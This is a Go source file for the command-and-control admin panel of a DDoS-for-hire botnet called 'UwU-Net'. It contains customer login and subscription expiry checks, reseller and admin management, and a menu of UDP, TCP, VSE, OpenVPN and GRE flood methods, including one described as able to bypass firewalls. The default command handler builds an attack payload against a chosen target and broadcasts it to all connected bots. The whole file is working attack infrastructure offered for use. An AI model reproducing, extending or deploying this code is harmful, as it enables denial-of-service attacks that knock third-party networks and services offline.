package main

import (
	"fmt"
	"math/rand"
	"net"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/alexeyco/simpletable"
)

type CaptchaToken struct {
	Token     string
	ValidTime time.Time
}

var captchaTokens = make(map[string]CaptchaToken)

func generateRandomCaptcha() string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	tokenLength := 6 // You can adjust the length of the captcha token as needed
	rand.Seed(time.Now().UnixNano())

	token := make([]byte, tokenLength)
	for i := 0; i < tokenLength; i++ {
		token[i] = charset[rand.Intn(len(charset))]
	}

	return string(token)
}

// GenerateCaptcha generates a captcha token and returns it
func GenerateCaptcha() string {
	token := generateRandomCaptcha()             // Implement your captcha generation logic here
	validTime := time.Now().Add(5 * time.Minute) // Set an expiration time for the captcha token

	captchaTokens[token] = CaptchaToken{
		Token:     token,
		ValidTime: validTime,
	}

	return token
}

// Admin is the main interface for admin management and controls
func Admin(conn net.Conn) {
	defer conn.Close()
	if _, err := conn.Write([]byte("\x1bc\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22\033]0;Please Enter Your Super Secret Kitty ID :3\007")); err != nil {
		return
	}

	conn.Read(make([]byte, 32))

	// Username will read from the terminal
	username, err := Read(conn, "[1;35mKitty [1;36m:3[1;37m\x1b[38;5;15m~#\x1b[0m ", "", 20)
	if err != nil {
		return
	}

	account, err := FindUser(username)
	if err != nil || account == nil {
		conn.Write([]byte("[1;31m Unknown Kitty Better Luck Nextime [1;35m:3\x1b[38;5;15m! \x1b[0m"))
		time.Sleep(50 * time.Millisecond)
		return
	}

	// Password will read from the terminal
	password, err := Read(conn, "[1;36mSecret [1;35m:3[1;37m\x1b[38;5;15m~#\x1b[0m ", "*", 20)
	if err != nil {
		return
	} else if password != account.Password {
		conn.Write([]byte("[1;31m Unknown Secret Better Luck NextTime!\x1b[38;5;15m! \x1b[0m"))
		time.Sleep(50 * time.Millisecond)
		return
	}
	if strings.TrimSpace(username) != "root" {
		// Generate and display a captcha
		captcha := GenerateCaptcha()
		conn.Write([]byte(fmt.Sprintf("[1;36mPlease Enter The Anti-Spy Captcha: %s\x1b[38;5;15m>\x1b[0m ", captcha)))

		// Read the user's captcha input
		captchaInput, err := Read(conn, "", "", 20)
		if err != nil || captchaInput != captcha {
			conn.Write([]byte("[1;31m Captcha failed Sorry AI But Not This Time!\x1b[38;5;15m!\x1b[0m"))
			time.Sleep(50 * time.Millisecond)
			return
		}
	}

	// User is a new user so therefore they will need to modify their password.
	if account.NewUser {
		conn.Write([]byte("[1;35mAs you are a new-kitty you are required to change your secret\x1b[38;5;15m!\x1b[0m\r\n"))
		newpassword, err := Read(conn, "[1;35msecret\x1b[38;5;15m>\x1b[0m ", "*", 20)
		if err != nil {
			return
		}

		if err := ModifyField(account, "password", newpassword); err != nil {
			conn.Write([]byte("[1;31mUnable to change secret!"))
			time.Sleep(50 * time.Millisecond)
			return
		}

		ModifyField(account, "newuser", false)
	}

	if account.Expiry <= time.Now().Unix() {
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\x1b[38;5;15mYour plan has expired! contact your seller to renew!\x1b[0m"))
		time.Sleep(10 * time.Second)
		return
	}

	session := NewSession(conn, account)
	defer delete(Sessions, session.Opened.Unix())

	conn.Write([]byte("\x1bc\r\n"))
	conn.Write([]byte("[1;35mWelcome to UwU-Net type ?/help to see commands UWU [1;36m:3	[1;37m			\r\n"))
	conn.Write([]byte("\r\n"))
	for {
		command, err := ReadWithHistory(conn, fmt.Sprintf("\x1b[1;35m%s\x1b[38;5;15m@\x1b[1;36mUwU[1;35m-[1;36mNet[1;35m~# [1;37m ", session.User.Username), "", 60, session.History)
		if err != nil {
			return
		}

		session.History = append(session.History, command)

		// Main command handling
		switch strings.Split(strings.ToLower(command), " ")[0] {

		// Clear command
		case "clear", "cls", "c":
			session.History = make([]string, 0)
			conn.Write([]byte("\x1bc\r\n"))
			conn.Write([]byte("[1;35mWelcome to Akane [1;36m:3 [1;35mtype ?/help to see commands UWU [1;36m:3	[1;37m			\r\n"))
			conn.Write([]byte("\r\n"))
			continue

		// Methods command
		case "methods", "method", "syntax":
			session.Conn.Write([]byte("\r\n"))
			item := MethodsFromMapToArray(make([]string, 0))
			sort.Slice(item, func(i, j int) bool {
				return len(item[i]) < len(item[j])
			})

			// Ranges through all the methods
			session.Conn.Write([]byte("[1;36mUser Datagram Protocol\r\n"))
			session.Conn.Write([]byte("[1;35m.udpl      [1;36m: [1;35mudp plain flood\r\n"))
			session.Conn.Write([]byte("[1;35m.udphex    [1;36m: [1;35mcomplex udp hex flood\r\n"))
			session.Conn.Write([]byte("[1;35m.udprand   [1;36m: [1;35mudp flood creates multiple sockets with random payload\r\n"))
			session.Conn.Write([]byte("[1;35m.udpwizard [1;36m: [1;35madvanced udp flood with random payloads\r\n"))
			session.Conn.Write([]byte("[1;35m.vse       [1;36m: [1;35mvalve source engine query udp flood \r\n"))
			session.Conn.Write([]byte("[1;36mTransmission Control Protocol\r\n"))
			session.Conn.Write([]byte("[1;35m.syn	   [1;36m: [1;35mtcp syn flood, Flags (URG, ACK, PSH, RST, SYN, FIN)\r\n"))
			session.Conn.Write([]byte("[1;35m.ack       [1;36m: [1;35mtcp ackflood with random payload data\r\n"))
			session.Conn.Write([]byte("[1;35m.wra       [1;36m: [1;35mtcp wra flood\r\n"))
			session.Conn.Write([]byte("[1;35m.socket    [1;36m: [1;35mtcp handshake with socket\r\n"))
			session.Conn.Write([]byte("[1;35m.handshake [1;36m: [1;35mtcp syn+ack handshake flood \r\n"))
			session.Conn.Write([]byte("[1;35m.stream    [1;36m: [1;35mtcp packet stream flood\r\n"))
			session.Conn.Write([]byte("[1;35m.tcpsack   [1;36m: [1;35mtcpsack flood bypass mitigated networks/firewall\r\n"))
			session.Conn.Write([]byte("[1;35m.vpn       [1;36m: [1;35mtcp openvpn rst flood\r\n"))
			session.Conn.Write([]byte("[1;35m.tcppsh    [1;36m: [1;35mtcp syn+psh handshake with various TCP flags\r\n"))
			session.Conn.Write([]byte("[1;36mL3 Floods\r\n"))
			session.Conn.Write([]byte("[1;35m.icmp      [1;36m: [1;35ml3 icmp echo flood\r\n"))
			session.Conn.Write([]byte("[1;35m.greip     [1;36m: [1;35ml3 greip flood\r\n\r\n"))
			session.Conn.Write([]byte("[1;35m syntax[1;36m:[1;35m [1;36m.[1;35mudpl 1.1.1.1 30 [1;36m?[1;35m[[1;36moptions[1;35m] \r\n"))
		case "?", "help", "h":
			access := 2
			session.Conn.Write([]byte("\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "[1;35mmethods\x1b[38;5;15m - [1;35mview all methods available\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "[1;35mclear\x1b[38;5;15m - [1;35mclears your terminal and history\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "[1;35mcreate\x1b[38;5;15m - [1;35mcreate a new user\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "[1;35mremove\x1b[38;5;15m - [1;35mremoves a existing user\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "[1;35madmin\x1b[38;5;15m - [1;35mmodify a users admin status\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "[1;35mapi\x1b[38;5;15m - [1;35mmodify a users api status\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "[1;35mbots\x1b[38;5;15m - [1;35mview the different types of bots connected\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "[1;35mattacks [1;35m - [1;35menables or disables attacks\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "[1;35mmaxtime\x1b[38;5;15m - [1;35mmodify a users maxtime\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "[1;35mcooldown\x1b[38;5;15m - [1;35mmodify a users cooldown\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "[1;35musers\x1b[38;5;15m - [1;35msee the users in the database\x1b[0m\r\n"))
			session.Conn.Write([]byte("\r\n"))

		case "attacks": // Enable/Disable attacks possible.
			args := strings.Split(strings.ToLower(command), " ")[1:]
			if !session.User.Admin || len(args) == 0 {
				session.Conn.Write([]byte("\x1b[38;5;9mAdmin access is needed for this command.\x1b[0m\r\n"))
				continue
			}

			switch strings.ToLower(args[0]) {

			case "enable", "active", "attacks": // Enable attacks
				Attacks = true
				session.Conn.Write([]byte("\x1b[38;5;10mAttacks are now enabled!\x1b[0m\r\n"))
			case "disable", "!attacks": // Disable attacks
				Attacks = false
				session.Conn.Write([]byte("\x1b[38;5;9mAttacks are now disabled!\x1b[0m\r\n"))

			case "global": // Change max cap
				if len(args[1:]) == 0 {
					session.Conn.Write([]byte("\x1b[38;5;9mInclude a new int for max.\x1b[0m\r\n"))
					continue
				}

				new, err := strconv.Atoi(args[1])
				if err != nil {
					session.Conn.Write([]byte("\x1b[38;5;9mInclude a new int for max.\x1b[0m\r\n"))
					continue
				}

				Options.Templates.Attacks.MaximumOngoing = new
				session.Conn.Write([]byte("\x1b[38;5;10mAttacks max running global cap changed!\x1b[0m\r\n"))

			case "reset_user": // Reset a users attack logs
				if len(args[1:]) == 0 {
					session.Conn.Write([]byte("\x1b[38;5;9mInclude a username\x1b[0m\r\n"))
					continue
				}

				if usr, _ := FindUser(args[1]); usr == nil {
					session.Conn.Write([]byte("\x1b[38;5;9mInclude a valid username\x1b[0m\r\n"))
					continue
				}

				if err := CleanAttacksForUser(args[1]); err != nil {
					session.Conn.Write([]byte("\x1b[38;5;9mFailed to clean attack logs!\x1b[0m\r\n"))
					continue
				}

				session.Conn.Write([]byte("\x1b[38;5;10mAttack logs reset for that user\x1b[0m\r\n"))
			}

			continue

		case "bots":
			// Non-admins can not see the different types of client sources connected
			if !session.User.Admin {
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[1;35mTotal[1;35m:\x1b[38;5;16m %d\x1b[0m\r\n", len(Clients))))
				continue
			}

			// Loops through all the access clients
			for source, amount := range SortClients(make(map[string]int)) {
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[1;35m%s[1;35m:  %d\x1b[0m\r\n", source, amount)))
			}

			continue
		case "api": // API examples/help
			if !session.User.API && !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have API access!\x1b[0m\r\n"))
				continue
			} else if session.User.Admin || session.User.Reseller && session.User.API {
				args := strings.Split(command, " ")[1:]
				if len(args) <= 1 {
					session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & bool\x1b[0m\r\n"))
					continue
				}

				status, err := strconv.ParseBool(args[0])
				if err != nil {
					session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & bool\x1b[0m\r\n"))
					continue
				}

				user, err := FindUser(args[1])
				if err != nil || user == nil {
					session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
					continue
				}

				if user.API == status {
					session.Conn.Write([]byte("\x1b[38;5;9mStatus is already what you are trying to change too\x1b[0m\r\n"))
					continue
				}

				if err := ModifyField(user, "api", status); err != nil {
					session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users api status\x1b[0m\r\n"))
					continue
				}

				session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users api status to %v!\x1b[0m\r\n", status)))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mHey %s, it seems you have API access!\x1b[0m\r\n", session.User.Username)))

		case "admin":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & bool\x1b[0m\r\n"))
				continue
			}

			status, err := strconv.ParseBool(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & bool\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if user.Admin == status {
				session.Conn.Write([]byte("\x1b[38;5;9mStatus is already what you are trying to change too\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "admin", status); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users admin status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users admin status to %v!\x1b[0m\r\n", status)))
			continue

		case "reseller":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & bool\x1b[0m\r\n"))
				continue
			}

			status, err := strconv.ParseBool(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & bool\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if user.Reseller == status {
				session.Conn.Write([]byte("\x1b[38;5;9mStatus is already what you are trying to change too\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "reseller", status); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users reseller status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users reseller status to %v!\x1b[0m\r\n", status)))
			continue

		case "maxtime":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			maxtime, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "maxtime", maxtime); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users maxtime status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users maxtime status to %d!\x1b[0m\r\n", maxtime)))
			continue

		case "cooldown":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			cooldown, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "cooldown", cooldown); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users maxtime status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users cooldown status to %d!\x1b[0m\r\n", cooldown)))
			continue

		case "conns":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			conns, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "conns", conns); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users conns status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users conns status to %d!\x1b[0m\r\n", conns)))
			continue

		case "max_daily":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			days, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "max_daily", days); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users max_daily status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users max_daily status to %d!\x1b[0m\r\n", days)))
			continue

		case "days":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			days, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "expiry", time.Now().Add(time.Duration(days)*24*time.Hour).Unix()); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users maxtime status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users expiry status to %d!\x1b[0m\r\n", days)))
			continue

		case "create": // Creates a new user
			if !session.User.Admin && !session.User.Reseller {
				session.Conn.Write([]byte("\x1b[38;5;9mOnly admins/resellers can currently create users!\x1b[0m\r\n"))
				continue
			}

			args := make(map[string]string)
			order := []string{"username", "password", "days"}
			for pos := 1; pos < len(strings.Split(strings.ToLower(command), " ")); pos++ {
				if pos-1 >= len(order) {
					break
				}

				args[order[pos-1]] = strings.Split(strings.ToLower(command), " ")[pos]
			}

			// Allows allocation not inside the args
			for _, item := range order {
				if _, ok := args[item]; ok {
					continue
				}
				value, err := Read(conn, item+"> ", "", 40)
				if err != nil {
					return
				}
				args[item] = value
			}

			if usr, _ := FindUser(args["username"]); usr != nil {
				session.Conn.Write([]byte("\x1b[38;5;11mUser already exists in SQL!\x1b[0m\r\n"))
				continue
			}

			expiry, err := strconv.Atoi(args["days"])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;11mDays active must be a int!\x1b[0m\r\n"))
				continue
			}

			// Inserts the user into the database
			err = CreateUser(&User{Username: args["username"], Password: args["password"], Maxtime: Options.Templates.Database.Defaults.Maxtime, Admin: Options.Templates.Database.Defaults.Admin, API: Options.Templates.Database.Defaults.API, Cooldown: Options.Templates.Database.Defaults.Cooldown, Conns: Options.Templates.Database.Defaults.Concurrents, MaxDaily: Options.Templates.Database.Defaults.MaxDaily, NewUser: true, Expiry: time.Now().Add(time.Duration(expiry) * time.Hour * 24).Unix()})
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mError creating user inside the database!\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte("\x1b[38;5;10mUser created successfully\x1b[0m\r\n"))
			continue

		case "remove": // Remove a choosen user from the database
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 0 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username\x1b[0m\r\n"))
				continue
			}

			if usr, _ := FindUser(args[0]); usr == nil || err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUnknown username\x1b[0m\r\n"))
				continue
			}

			if err := RemoveUser(args[0]); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to remove user\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte("\x1b[38;5;10mRemoved the user!\x1b[0m\r\n"))
			continue

		case "broadcast": // Broadcast a message to all the clients connected
			message := strings.Join(strings.Split(command, " ")[1:], " ")
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}

			for _, s := range Sessions {
				s.Conn.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K \x1b[48;5;11m\x1b[38;5;16m " + fmt.Sprintf("%s", message) + " \x1b[0m\x1b8"))
			}

		case "users":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}

			users, err := GetUsers()
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mErr: " + err.Error() + "\x1b[0m\r\n"))
				continue
			}

			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "[1;35m" + "#"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "Time"},
					{Align: simpletable.AlignCenter, Text: "Conns"},
					{Align: simpletable.AlignCenter, Text: "Cooldown"},
					{Align: simpletable.AlignCenter, Text: "MaxDaily"},
					{Align: simpletable.AlignCenter, Text: "Admin"},
					{Align: simpletable.AlignCenter, Text: "Reseller"},
					{Align: simpletable.AlignCenter, Text: "API" + "\x1b[1;35m"},
				},
			}

			for _, u := range users {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m" + fmt.Sprint(u.ID) + "[1;35m"},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(u.Username)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;215m%d[1;35m", u.Maxtime)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;215m%d[1;35m", u.Conns)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;215m%d[1;35m", u.Cooldown)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;215m%d[1;35m", u.MaxDaily)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.Admin) + "[1;35m")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.Reseller) + "[1;35m")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.API)+"[1;35m") + "\x1b[0m"},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			session.Conn.Write([]byte(strings.ReplaceAll(new.String(), "\n", "\r\n") + "\r\n"))
			continue

		case "ongoing": // Global ongoing attacks
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}

			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "[1;35m" + "#"},
					{Align: simpletable.AlignCenter, Text: "Target"},
					{Align: simpletable.AlignCenter, Text: "Duration"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "Finish\x1b[1;35m"},
				},
			}

			ongoing, err := OngoingAttacks(time.Now())
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mCant fetch ongoing attacks\x1b[0m\r\n"))
				continue
			}

			for i, attack := range ongoing {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m" + fmt.Sprint(i) + "[1;35m"},
					{Align: simpletable.AlignCenter, Text: attack.Target},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(attack.Duration)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(attack.User)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;9m%.2fsecs[1;35m", time.Until(time.Unix(attack.Finish, 0)).Seconds()) + "\x1b[1;35m"},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			session.Conn.Write([]byte(strings.ReplaceAll(new.String(), "\n", "\r\n") + "\r\n"))
			continue

		case "sessions":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}

			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "[1;35m" + "#"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "IP"},
					{Align: simpletable.AlignCenter, Text: "Admin"},
					{Align: simpletable.AlignCenter, Text: "Reseller"},
					{Align: simpletable.AlignCenter, Text: "API" + "\x1b[1;35m"},
				},
			}

			for i, u := range Sessions {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m" + fmt.Sprint(i) + "[1;35m"},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(u.User.Username)},
					{Align: simpletable.AlignCenter, Text: strings.Join(strings.Split(u.Conn.RemoteAddr().String(), ":")[:len(strings.Split(u.Conn.RemoteAddr().String(), ":"))-1], ":")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.User.Admin) + "[1;35m")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.User.Reseller) + "[1;35m")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.User.API)+"[1;35m") + "\x1b[0m"},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			session.Conn.Write([]byte(strings.ReplaceAll(new.String(), "\n", "\r\n") + "\r\n"))
			continue

		default:
			attack, ok := IsMethod(strings.Split(strings.ToLower(command), " ")[0])
			if !ok && attack == nil {
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;16m`\x1b[38;5;9m\x1b[9m%s\x1b[0m\x1b[38;5;16m`[1;35m doesn't exist!\x1b[0m\r\n", strings.Split(strings.ToLower(command), " ")[0])))
				continue
			}

			// Builds the attack command into bytes
			payload, err := attack.Parse(strings.Split(command, " "), account)
			if err != nil {
				session.Conn.Write([]byte(fmt.Sprint(err) + "\r\n"))
				continue
			}

			bytes, err := payload.Bytes()
			if err != nil {
				session.Conn.Write([]byte(fmt.Sprint(err) + "\r\n"))
				continue
			}

			BroadcastClients(bytes)
			if len(Clients) <= 1 { // 1 or less clients broadcasted too
				session.Conn.Write([]byte(fmt.Sprintf("[1;36mCommand broadcasted to [1;35m%d [1;36mactive device[1;35m!\x1b[0m\r\n", len(Clients))))
			} else { // 2 or more clients broadcasted too
				session.Conn.Write([]byte(fmt.Sprintf("[1;36mCommand broadcasted to [1;35m%d [1;36mactive devices[1;35m!\x1b[0m\r\n", len(Clients))))
			}
		}
	}
}

// FormatBool will take the string and convert into a coloured boolean
func FormatBool(b bool) string {
	if b {
		return "\x1b[38;5;10mtrue\x1b[0m"
	}

	return "\x1b[38;5;9mfalse\x1b[0m"
}
